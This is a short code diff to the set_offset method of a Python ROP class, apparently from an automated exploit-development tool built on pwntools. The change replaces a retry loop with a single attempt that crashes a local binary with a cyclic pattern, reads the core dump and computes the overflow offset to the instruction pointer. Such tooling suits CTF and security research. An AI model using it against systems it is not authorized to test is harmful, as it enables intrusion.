@@ -59,19 +59,18 @@ class ROP:
     def set_offset(self):
         print("Attempting to find the offset to control the instruction pointer")
         attempts = 0
-        while attempts < 5:
-            try:
-                p = process(self.filename)
-                p.sendline(cyclic(1024, n=8))
-                p.wait()
-                core = p.corefile
-                p.close()
-                os.remove(core.file.name)
-                offset = cyclic_find(core.read(core.rsp, 8), n=8)
-                return b'A'*offset
-            # TODO: catch all exceptions and run symbolic analysis as a last ditch effort
-            except PwnlibException as e:
-                attempts += 1
+        #try:
+        p = process(self.filename)
+        p.sendline(cyclic(1024, n=8))
+        p.wait()
+        core = p.corefile
+        p.close()
+        os.remove(core.file.name)
+        offset = cyclic_find(core.read(core.rsp, 8), n=8)
+        return b'A'*offset
+        # TODO: catch all exceptions and run symbolic analysis as a last ditch effort
+        #except PwnlibException as e:
+        #    attempts += 1
 
         self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
         return Get2overflow(self.filename, self.v_lvl).buf()
